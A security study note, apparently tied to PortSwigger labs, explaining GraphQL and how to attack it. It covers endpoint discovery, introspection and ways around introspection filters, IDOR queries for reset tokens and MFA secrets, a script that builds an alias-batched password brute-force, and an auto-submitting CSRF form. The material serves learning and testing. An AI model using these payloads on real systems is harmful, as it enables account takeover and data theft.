---
created: 2026-05-24
tags:
  - web_hacking
  - api_testing
status: substantial
---
## GraphQL

>**GraphQL (Graph Query Language)** is a query language for APIs and a server-side runtime for executing queries against a typed schema. 

- GraphQL allows clients to declaratively specify the exact shape of data they need in a single request, and query these exact data. This solves *over-fetching* and *under-fetching* problems endemic to REST.

>[!interesting]+ GraphQL was developed internally by Facebook in 2012 and released as open-source in 2015. 

- The server exposes a **single endpoint** — typically `/graphql`. 
- Clients communicate with it by sending structured query documents in the request body. 
- The server parses and validates each query against its schema, delegates field resolution to resolver functions, and returns a JSON response whose shape mirrors the query exactly.

>[!note] GraphQL is often used as a **unified data query layer**. It is *not tied to any specific database or storage engine*. It can aggregate data from *multiple sources* — databases, REST APIs, microservices — and present it as a consistent, strongly typed schema. 

- Request-response cycle looks like this:
	1. The client constructs a GraphQL operation document (*query*, *mutation*, or *subscription*) and sends it as a JSON payload, usually via `POST`.
	2. The server parses and validates the document against the schema.
	3. Per-field **resolver** functions execute, fetching or mutating data from the appropriate backends (databases, REST APIs, microservices, etc.).
	4. The server assembles a JSON response that structurally mirrors the query, delivering exactly the requested fields — nothing more.
	5. Errors are passed in a structured `errors` array alongside whatever partial data was successfully retrieved, rather than replacing it entirely.

>[!interesting]+ Why GraphQL exists
>- REST forces clients to either accept whatever a fixed endpoint returns (over-fetching) or stitch data from multiple endpoint calls (under-fetching). 
>- Both patterns waste bandwidth and increase round-trips. 
>- GraphQL inverts the model: the client is authoritative about what it needs, and the server is responsible for delivering precisely that. 

>[!note]+ GraphQL vs. REST 
> | Characteristic      | REST                              | GraphQL                           |
> | ------------------- | --------------------------------- | --------------------------------- |
> | Endpoints  | Multiple endpoints (`/users`, `/orders`).    | Single endpoint (`/graphql`).               |
> | Data fetching       | Fixed server-defined shapes.       | Client-defined, field-precise.     |
> | Over/under-fetching | Common problem.                  | Solved by design.                  |
> | Schema / contract   | Optional (OpenAPI external).       | Mandatory, built-in SDL.           |
> | Introspection       | None built-in.                     | Native `__schema` / `__type`.      |
> | Versioning          | Explicit (`/v1`, `/v2`).           | Schema evolution, backward-compatibility. |
> | Real-time           | External (SSE, polling).           | Native subscriptions (WebSocket).  |
> | HTTP methods        | `GET` / `POST` / `PUT` / `DELETE`. | Typically `POST` (all operations).   |
> | Response on error   | HTTP status code.                  | `errors` array, possibly alongside partial data.     |
> 

### GraphQL concepts

#### Schema 

>A **GraphQL schema** is a comprehensive description of the data available to clients and the operations they can perform, written in **SDL (Schema Definition Language)**. It acts as a *contract* between the server and the client.

- A schema defines all available types, theirs fields, and relationship between them, as well as the root operation types — `Query`, `Mutation`, `Subscription` — that serve as entry points for every operation. 
---
- Every schema must declare at least a `Query` type (for reading data). `Mutation` (writing) and `Subscription` (real-time retrieval) are optional. 

>[!example]+
> ```yaml
> schema {
>   query: Query
>   mutation: Mutation
>   subscription: Subscription
> }
> ```

- The schema enforces strong typing: every field has a declared type, and the runtime rejects operations that violate those types.

>[!example]+
> ```yaml
> type User {
>   id: ID!         # non-null: always present
>   name: String!   # non-null
>   email: String   # nullable: may be absent
>   role: UserRole! # enum, non-null
>   posts: [Post!]! # non-null array of non-null Post objects
> }
> ```

- The `!` modifier marks a field or argument as non-nullable (mandatory).

#### Types

>A **GraphQL type** is a *named definition* within the schema that describes the shape and data kind of a value — whether that value is an object, a scalar primitive, an enumeration, a union, an interface, or an input container for mutation arguments.

The main categories:

- **Object types** — Named groupings of fields representing entities (e.g., `User`, `Product`, `Order`). These are the most common type and the primary target for data extraction.

>[!example]- 
> ```Python
> type User {
>   id: ID!
>   name: String!
>   email: String
>   posts: [Post]
> }
> ```

- **Scalar types** — Built-in primitive types like `String`, `Int`, `Float`, `Boolean`, `ID`. The server can define custom types. 

- **Enum types** — Named sets of allowed values. 

>[!example]-
> ```yaml
> enum UserRole {
>   ADMIN
>   MODERATOR
>   MEMBER
>   GUEST
> }
> 
> # using the enum type
> type User {
>   id: ID!
>   name: String!
>   role: UserRole!
>   # ...
> }
> ```

- **Input types** — Object types used as mutation arguments; can't be queried directly.

>[!example]-
> ```Python
> input PostInput {
>   title: String!
>   content: String
> }
> ```

- **Interface types** — Define common fields that multiple types can implement.

>[!example]- 
> ```Python
> interface Content {
>   id: ID!
>   createdAt: String!
> }
> type Post implements Content {
>   id: ID!
>   createdAt: String!
>   title: String
>   body: String
> }
> ```
> 

- **Union types** — Represent a value that could be one of several types.

>[!example]-
> ```Python
> # a search retult can be different types of content
> union SearchResult = Post | User | Comment | Tag
> ```

>[!note] See [`Schemas and Types — GraphQL Learn`](https://graphql.org/learn/schema/).

#### Queries

>A **GraphQL query** is a read-only operation used to retrieve data from the server.

>[!note]+ Query operations are a rough equivalent of the `GET` HTTP method in REST, but sent as a `POST` request body with the query specified as a document string.

>[!example]+
> ```yaml
> query GetUser {
>   user(id: "123") {
>     name
>     email
>     role
>   }
> }
> ```
> 
> - The response mirrors the query shape:
> 
> ```json
> {
>   "data": {
>     "user": {
>       "name": "John Doe",
>       "email": "john_doe@example.com",
>       "role": "admin"
>     }
>   }
> }
> ```

>[!note] The `query` keyword is technically optional for read operations (you can send just `{ user(id: "123") { name } }`), but including it is best practice and required when you want to name the operation or use variables.

>[!note] See [`Queries — GraphQL Learn`](https://graphql.org/learn/queries/).

#### Mutations

>A **GraphQL mutation** is a write operation used to create, update, or delete server-side data. 

>[!note] Mutations are the equivalent of REST's `POST`, `PUT`, `PATCH`, and `DELETE` methods.

>[!example]+
> ```yaml
> mutation CreateUser {
>   createUser(input: { name: "Jane Doe", email: "jane_doe@example.com", role: admin }) {
>     id
>     name
>   }
> }
> ```
> 
- Mutation operations return a graph of created or modified data.

>[!note] See [`Mutations — GraphQL Learn`](https://graphql.org/learn/mutations/).
#### Subscriptions

>A **GraphQL subscription** is a long-lived, server-initiated communication channel — typically implemented over WebSocket — by which the server pushes real-time data updates to connected clients when specific events occur.

>[!example]+
> ```yaml
> subscription OnNewMessage {
>   messageReceived(channelId: "42") {
>     id
>     content
>     sender { name }
>   }
> }
> ```

>[!note] See [`Subscriptions — GraphQL Learn`](https://graphql.org/learn/subscriptions/).

#### Fields and arguments

>A **field** is a named, typed unit within a GraphQL type definition. In an operation document, fields are what the client requests; in the schema, fields define what data is available and what type each piece of data has.

>[!example] When a client queries `user { name email }`, `name` and `email` are fields being requested on the `User` type. 

> **Arguments** are named input values attached to a field in a query or mutation, used to filter, paginate, or parameterize the resolver's behavior. 

>[!note] Unlike REST path parameters or query strings, GraphQL arguments are always named and typed according to the schema.

>[!example]+
> ```yaml
> type Query {
>   user(id: ID!): User
>   products(limit: Int = 10, offset: Int = 0, category: String): [Product!]!
> }
> ```
> 
> - In a query:
> 
> ```yaml
> query {
>   products(limit: 5, category: "electronics") {
>     name
>     price
>   }
> }
> ```
> 
####  Aliases 

- GraphQL prohibits duplicate field names in the same selection set.
- Aliases let you name each field explicitly, removing that constraint.

> [!example]+
> ```yaml
> query {
>   product1: getProduct(id: "1") { id name price }
>   product2: getProduct(id: "2") { id name price }
>   product3: getProduct(id: "3") { id name price }
> }
> ```
> 
> - The server resolves multiple `getProduct` calls, but results are keyed by different alias names.


### Security posture

- **Single endpoint** -> The entire API is reachable at one URL; all attacks converge here (see [[#1. Identifying the GraphQL endpoint]]).
- **Client-controlled field selection** -> Authorization must be enforced at the field level, not just the endpoint. This is far harder to get right.
- **Native introspection** -> The schema — a complete map of all types and operations — can be extracted in one request if introspection is enabled (see [[#Introspection]]).
- **Arguments control object access** -> Any argument that directly identifies a resource (by ID, username, etc.) is potential IDOR vector (see [[#Exploiting IDOR in GraphQL]]).
- **Aliases allow operation batching** -> Multiple operations in one HTTP request can bypass rate limiters that count requests rather than operations (see [[#Bypassing rate limiting using aliases]]).
- **Non-`application/json` content types may be accepted** -> If the server accepts `application/x-www-form-urlencoded`, CSRF becomes trivially exploitable via a standard HTML form.
- **Suggestions on typos** -> Apollo-based servers will hint at valid field names in error messages, leaking schema structure even when introspection is disabled.
- **Deep nesting allowed by default** -> Deeply nested queries can exhaust server resources. Without depth/complexity limits, this enables DoS.

## Discovering and inspecting GraphQL endpoints

### 1. Identifying the GraphQL endpoint

- GraphQL APIs expose a **single endpoint** for all operations.
#### Universal query

- Every GraphQL server exposes a reserved meta-field called **`__typename`** on every type, which returns that type's name as a string. 
- To detect a GraphQL endpoint, send the following query to the candidate URL:

```
query{__typename}
```


```http
POST /graphql HTTP/1.1
Content-Type: application/json

{"query": "{__typename}"}
```

- A genuine GraphQL endpoint will include `{"data":{"__typename":"query"}}` somewhere in its response.
- This is called a **universal query**; it is valid on any GraphQL endpoint regardless of schema.

#### Common endpoint locations

- Try the universal query against a list of candidate endpoints:

```
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
/v1/graphql
/api/v1/graphql
/gql
/query
/graphiql
/playground
/explorer
```

>[!tip]+
>If none respond as expected, try appending `/v1` to any that return an error response with GraphQL-like content (e.g., `"errors": [{"message": "query not present"}]`). That error pattern itself is a strong GraphQL indicator.

#### Testing alternative HTTP methods

- Production best practice dictates that GraphQL endpoints should only accept `POST` with `Content-Type: application/json`. 
- However, many implementations also accept:
	- `GET` requests with the query in the URL parameter (susceptible to [[CSRF]]).
	- `POST` with `Content-Type: application/x-www-form-urlencoded`.

- `GET` with URL-encoded query:

```http
GET /graphql?query={__typename} HTTP/1.1
```

- `POST` with form-encoded body:

```http
POST /graphql HTTP/1.1
Content-Type: application/x-www-form-urlencoded

query=%7B__typename%7D
```

#### Inspecting application traffic

- Once you confirm the endpoint, explore the application normally in Burp's browser. 
- GraphQL-heavy applications send most of their queries through JavaScript, so you'll see them accumulate in the HTTP History. This gives you:
	- A list of operations the application actually uses (often more useful than introspection alone).
	- Variable names and data types in use.
	- Any custom headers (API keys, auth tokens) required.

- In Burp Suite Professional, the **GraphQL tab** parses GraphQL requests automatically and allows you to edit queries interactively (right-click a GraphQL request in HTTP History and send it to Repeater as normal HTTP request).

### 2. Schema discovery and introspection

#### Introspection

- Once you have the endpoint, the priority is to obtain the full schema. 

>**GraphQL introspection** is a built-in feature that allows clients to query a server for metadata about its **schema**, including available types, fields, queries, mutations, and directives.

1. **Confirm introspection is enabled:**

	```http
	POST /graphql HTTP/1.1
	Content-Type: application/json
	
	{"query": "{__schema{queryType{name}}}"}
	```
	
	- If introspection is enabled, the response will return something like:
	
	```json
	{"data": {"__schema": {"queryType": {"name": "Query"}}}}
	```
	
	- If it returns an error (`Cannot query field "__schema" on type "Query"`), introspection is disabled — proceed to the bypass section.

2. **Run the full introspection query:** 
	- The full introspection query returns every type, field, argument, deprecation status, and description the schema exposes.

>[!important]- Full introspection query 
> ```yaml
> 
>     #Full introspection query
> 
>     query IntrospectionQuery {
>         __schema {
>             queryType {
>                 name
>             }
>             mutationType {
>                 name
>             }
>             subscriptionType {
>                 name
>             }
>             types {
>              ...FullType
>             }
>             directives {
>                 name
>                 description
>                 args {
>                     ...InputValue
>             }
>             onOperation  #Often needs to be deleted to run query
>             onFragment   #Often needs to be deleted to run query
>             onField      #Often needs to be deleted to run query
>             }
>         }
>     }
> 
>     fragment FullType on __Type {
>         kind
>         name
>         description
>         fields(includeDeprecated: true) {
>             name
>             description
>             args {
>                 ...InputValue
>             }
>             type {
>                 ...TypeRef
>             }
>             isDeprecated
>             deprecationReason
>         }
>         inputFields {
>             ...InputValue
>         }
>         interfaces {
>             ...TypeRef
>         }
>         enumValues(includeDeprecated: true) {
>             name
>             description
>             isDeprecated
>             deprecationReason
>         }
>         possibleTypes {
>             ...TypeRef
>         }
>     }
> 
>     fragment InputValue on __InputValue {
>         name
>         description
>         type {
>             ...TypeRef
>         }
>         defaultValue
>     }
> 
>     fragment TypeRef on __Type {
>         kind
>         name
>         ofType {
>             kind
>             name
>             ofType {
>                 kind
>                 name
>                 ofType {
>                     kind
>                     name
>                 }
>             }
>         }
>     }
> 
> ```

>[!note]+ Burp Scanner can automatically test for introspection during its scans. If it finds that introspection is enabled, it reports a "GraphQL introspection enabled" issue.

>[!note] The `onOperation`, `onFragment`, and `onField` directives in the `directives` block are not universally supported and may cause some servers to reject the query. If introspection is enabled but the above query doesn't run, remove these directives. 

>[!tip] To generate an introspection query automatically in Burp, send a GraphQL request to `Repeater`, then `GraphQL` -> `Set introspection query`. 
>![[graphql_repeater.png]]

>[!note] Burp's auto-generated introspection query omits  `onOperation`, `onFragment`, and `onField` by default.

- Pay special attention to:
	- `fields(includeDeprecated: true)` — This flag includes fields the developers have marked for removal. Deprecated fields are often still functional and less closely monitored.
	- `description` fields — Developers sometimes leave notes in descriptions that leak internal architecture, backend names, or data sensitivity (e.g., "Internal admin use only").

#### Visualizing the schema

- Raw introspection output often contains thousands of lines of JSON. 
- To visualize the schema, you can use [`GraphQL Voyager`](https://apis.guru/graphql-voyager/) or [`GraphQL Visualizer`](http://nathanrandal.com/graphql-visualizer/). Paste the full introspection response and you get a graphical map of all types and their relationships.

![[images/walkthrough/PortSwigger/GraphQL/lab1/4.png]]

- Visualization make it easier to spot:
	- Types containing sensitive fields (passwords, tokens, PII)
	- Operations that accept ID arguments (IDOR candidates)
	- Admin or privileged operation names
	- Relationships between objects that could enable chaining

#### Bypassing introspection defenses

- **Whitespace injection**
	- GraphQL's parser treats newlines, spaces, and commas as insignificant whitespace and ignores them; a native filter matching `__schema{`, however, will fail if you insert a valid whitespace between `__schema` and `{`.

```json
{"query": "query{\n__schema\n{queryType{name}}}"}
```

```json
{"query": "query{__schema {queryType{name}}}"}
```

```json
{"query": "query{__schema,{queryType{name}}}"}
```

- **Alternative HTTP method**
	- Introspection may be blocked only for `POST` requests. Try sending via `GET`:
	
```http
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D HTTP/1.1
```

- URL-decoded, the query value is: `query{__schema\n{queryType{name}}}` — the newline is encoded as `%0A`. This simultaneously inserts a whitespace to bypass exact-matching filters.

- **`POST` with form encoding**
	- Also attempt to send a `POST` query but with a form encoding (`Content-Type: application/x-www-form-urlencoded`):

```http
POST /graphql HTTP/1.1
Content-Type: application/x-www-form-urlencoded

query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```
	
#### Schema enumeration via suggestions

- Even when introspection is fully and correctly disabled with no bypass available, **Apollo-based GraphQL servers** (by far the most common in real applications) have a "suggestions" feature enabled by default. 
- When a query references a field that almost — but not exactly — matches a valid field name, the error message tells you what you probably meant.

>[!example]+
> - For example, sending:
> 
> ```json
> {"query": "{ productInf { id } }"}
> ```
> 
> - Might return:
> 
> ```json
> {
>   "errors": [{
>     "message": "Cannot query field 'productInf' on type 'Query'. Did you mean 'productInfo'?"
>   }]
> }
> ```
> 

- This leaks a valid field name from the schema in plaintext. You can iterate through guesses and reconstruct large portions of the schema from these error messages.

---

- **[`Clairvoyance`](https://github.com/nikitastupin/clairvoyance)** automates this process. It uses a wordlist of common field names you supply, sends deliberately misspelled queries, and uses suggestion responses to map valid field names — even when introspection is fully disabled.

- Basic usage:

```bash
python3 main.py \
  -u https://example.com/graphql \
  -w /path/to/wordlist.txt \
  -o schema.json
```

- With custom headers:

```bash
python3 main.py \
  -u https://target.com/graphql \
  -H "Authorization: Bearer eyJ..." \
  -w /path/to/wordlist.txt \
  -o schema.json
```

> [!note] Apollo Server v4+ can suppress suggestions by setting `hideSchemaDetailsFromClientErrors: true`. Earlier versions require a workaround patch. If the server is not running v4+ or this option hasn't been set, suggestions are active regardless of introspection status.

## Exploiting IDOR in GraphQL

- With schema knowledge in hand, the next step is testing whether the server's authorization logic actually enforces access controls at the resolver (field) level.
- The most common failure is the GraphQL equivalent of an IDOR: a resolver that accepts an ID argument and returns the corresponding object without verifying whether the requesting user is authorized to access it.

>[!interesting]+ Why this happens
> - In REST, endpoints like `GET /users/123` can be protected on the route level. In GraphQL, all operations arrive at the same endpoint, and field resolution is distributed across many individual resolver functions. 
> - It's not uncommon to see implementation where authorization is enforced only at the HTTP layer but not inside each resolver. This leaves every field universally accessible to anyone who can reach the endpoint.

- Look for:
	- Query fields that accept an `id` argument and return a sensitive object (`user(id: ID!)`, `order(id: ID!)`, `invoice(id: ID!)`).
	- Fields that return collections but can also be used to query objects individually.
	- Object types containing fields like `username`, `email`, `password`, `token`, etc.

>[!example]-
> - Querying a collection of objects:
> 
> ```json
> query {
>   products {
>     id
>     name
>     listed
>   }
> }
> ```
> 
> - Query specific objects:
> 
> ```json
> query {
>   product(id: 3) {
>     id
>     name
>     listed
>     internalNotes
>   }
> }
> ```
> 
> - Querying additional fields:
> 
> ```yaml
> query {
>   user(id: "2") {
>     id
>     username
>     email
>     passwordResetToken
>     mfaSecret
>     role
>   }
> }
> ```
t access via mutations as well. 

- Authorization failures are not limited to queries. Test mutations for the same pattern.

>[!example]-
> - Attempt to delete another user's post:
> 
> ```json
> mutation {
>   deletePost(id: "12") {
>     success
>     message
>   }
> }
> ```
> 
> - Attempt to update another user's email:
> 
> ```json
> mutation {
>   updateUser(id: "2", input: { email: "pwned@example.com" }) {
>     id
>     email
>   }
> }
> ```
## Bypassing rate limiting using aliases

- Standard HTTP rate limiting works by counting the number of requests from a given IP address or session token within a time window. A rate limiter configured this way counts one HTTP request as one "attempt" — regardless of how many operations that request actually performs.
- Ordinarily, GraphQL objects can't contain multiple properties with the same name, but this can be bypassed using [[#Aliases]].
- Combining these two facts together, you get a rate limiting bypass method via GraphQL aliases — you combine multiple resolved invocations withing a single document, so that just one HTTP requests can trigger dozens or hundreds of resolver calls.

> [!note] Aliases work identically for mutations. You can batch multiple state-changing operations (e.g., `createUser`, `deleteRecord`, `changePassword`) into a single HTTP request using the same technique. This is relevant not just for rate limit bypass but for any scenario where you want to minimize observable requests.
### Password brute-force

- Generate the payload programmatically:

```Python
print("mutation login {")

with open("passwords.txt", "r", encoding="utf-8") as file:
    for line in file:
        password = line.strip()

        print(f'''
attempt_{password}: login(input: {{ username: "carlos", password: "{password}" }}) {{
    success
}},
''')

print("}")
```

- The resulting query looks like:

```json
mutation login {

attempt_123456: login(input: { username: "carlos", password: "123456" }) {
    success
},


attempt_password: login(input: { username: "carlos", password: "password" }) {
    success
},


attempt_12345678: login(input: { username: "carlos", password: "12345678" }) {
    success
},
# ...
}
```

- To identify the correct password, search for `true` in the reponse:

![[images/walkthrough/PortSwigger/GraphQL/lab4/3.png]]

>[!bug]+ Labs
>- [[🛠️ GraphQL labs#4. Bypassing GraphQL brute force protections]].
## GraphQL CSRF

- [[CSRF]] vulnerabilities in GraphQL arise when the server accepts `POST` requests with a `Content-Type` **other than `/application/json`** and doesn't properly implement CSRF tokens.
- Additionally, GraphQL configurations that accept queries via `GET` requests are vulnerable to `GET`-based CSRF. 

>[!interesting]+ Why  `application/json` prevents CSRF
>- Browsers impose restrictions on cross-origin requests based on the content type.
>- The `Content-Type: application/json` header is considered a "non-simple" content type, meaning the browser performs a [[🛠️ CORS]] preflight (`OPTIONS`) request before sending the actual `POST`. If the server's `CORS` policy does not include the attacker's origin, the preflight fails and the malicious request is blocked.
>- So, CSRF exploits via HTML `<form>` submissions are limited to `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain` content types. If a GraphQL endpoint only accepts `application/json`, it can't be targeted via a form-based CSRF exploit.

- To test whether the target endpoint is vulnerable, send a probe using a `GET` request or `POST` request with `Content-Type: application/x-www-form-urlencoded`:

```http
GET /graphql?query=mutation%20changeEmail%20%7B%0A%09changeEmail(input:%20%7B%20email:%20%22email@example.com%22%20%7D)%20%7B%0A%09%09email%0A%09%7D%0A%7D HTTP/1.1
```

```http
POST /graphql/v1 HTTP/2
Host: 0a0a006d04c3e59c80db309a00f700fc.web-security-academy.net
Content-Length: 173
Content-Type: application/x-www-form-urlencoded
# ...

query=mutation+changeEmail+%7b%0d%0a%09changeEmail%28input%3a+%7b+email%3a+%22email@example.com%22+%7d%29+%7b%0d%0a%09%09email%0d%0a%09%7d%0d%0a%7d&operationName=changeEmail
```

- If the query executes and returns data rather than an error, the endpoint accepts non-JSON methods without proper content-type validation, and CSRF is feasible.
- To confirm the full attack path, check if the endpoint requires CSRF tokens or implements other CSRF defenses (see [[CSRF#Defenses and how to bypass them]].

- If the tests worked, construct an exploit:

```html
<html>
	<body>
		<form action="https://example.com/graphql" method="POST">
		
		    <input type="hidden" name="query" value='mutation changeEmail {
		    changeEmail(input: { email: "pwned@example.com" }) {
		        email
		    }
		}'>
		
		    <input type="hidden" name="operationName" value="changeEmail">
		</form>
		
		<script>
            document.forms[0].submit();
        </script>

	</body>
</html>
```

> [!tip] Burp Suite's CSRF PoC generator (right-click a request → `Engagement tools` → `Generate CSRF PoC`) works for GraphQL CSRF if the request uses a method/content-type that forms can send. Change the content type of the captured request to `application/x-www-form-urlencoded` before using the generator if the original is `application/json`.
## References and further reading

- [`What is GraphQL? — PortSwigger`](https://portswigger.net/web-security/graphql/what-is-graphql)
- [`Schemas and Types — GraphQL Learn`](https://graphql.org/learn/schema/)
- [`Queries — GraphQL Learn`](https://graphql.org/learn/queries/)
- [`Mutations — GraphQL Learn`](https://graphql.org/learn/mutations/)

